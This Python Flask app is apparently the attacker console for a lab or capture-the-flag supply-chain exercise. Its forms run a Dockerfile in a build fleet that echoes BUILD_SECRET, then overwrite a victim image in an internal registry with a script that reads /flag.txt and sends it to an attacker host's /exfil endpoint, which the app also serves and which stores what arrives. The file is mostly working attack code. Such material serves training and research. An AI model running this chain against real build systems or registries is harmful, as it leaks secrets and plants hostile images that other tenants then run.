"""Supply-chain attack: build fleet -> writable internal registry -> victim image."""
import os
import urllib.parse

import requests
from flask import Flask, request

app = Flask(__name__)
BUILD = os.environ.get("BUILD_URL", "http://build-worker:5000")
REGISTRY = os.environ.get("REGISTRY_URL", "http://internal-registry:5000")
PULLER = os.environ.get("PULLER_URL", "http://tenant-puller:5000")

_exfil = []

HTML = """<h1>Build Fleet Supply Chain</h1>
<form method="post" action="/step1"><h3>Step 1 · RUN in build fleet</h3>
<textarea name="dockerfile" rows="5" cols="90">FROM scratch
RUN echo BUILD_SECRET=$BUILD_SECRET</textarea><br>
<button>Build</button></form>
<form method="post" action="/step2"><h3>Step 2 · overwrite victim image in internal registry</h3>
<textarea name="script" rows="3" cols="90">echo pwned; python3 -c "import urllib.request;urllib.request.urlopen('http://attacker:5000/exfil?data='+open('/flag.txt').read())"</textarea><br>
<button>Push</button></form>
<form method="post" action="/step3"><h3>Step 3 · trigger victim pull</h3>
<button>Pull</button></form>
<pre>{{out}}</pre>"""


def render(out):
    return HTML.replace("{{out}}", out)


@app.route("/")
def home():
    return render("Ready")


@app.route("/step1", methods=["POST"])
def step1():
    df = request.form.get("dockerfile", "")
    r = requests.post(f"{BUILD}/build", json={"dockerfile": df}, timeout=15)
    return render(f"Build output:\n{r.text}")


@app.route("/step2", methods=["POST"])
def step2():
    script = request.form.get("script", "")
    r = requests.put(f"{REGISTRY}/images/victim-app:latest", data=script, timeout=8)
    return render(f"Registry response: {r.text}")


@app.route("/step3", methods=["POST"])
def step3():
    r = requests.post(f"{PULLER}/pull", timeout=15)
    ex = _exfil[-1] if _exfil else "(no exfil received yet)"
    return render(f"Victim pull result:\n{r.text}\n\nExfil received:\n{ex}")


@app.route("/exfil")
def exfil():
    data = request.args.get("data", "")
    if data:
        _exfil.append(data)
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
